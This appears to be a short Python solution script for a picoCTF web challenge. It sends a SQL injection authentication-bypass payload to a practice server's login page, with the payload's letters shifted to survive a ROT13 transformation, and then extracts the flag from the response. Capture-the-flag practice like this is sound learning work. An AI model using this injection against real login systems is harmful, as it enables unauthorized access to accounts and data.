import requests
import re

url = 'http://fickle-tempest.picoctf.net:53244'

password = "' or 1--"

payload = {
    "password": "".join([chr(ord(c) - 13) if c.isalpha() else c for c in password]),
    "debug": 1
}

res = requests.post(f'{url}/login.php', data=payload)
print(re.findall(r'(picoCTF{.+})', res.text)[0])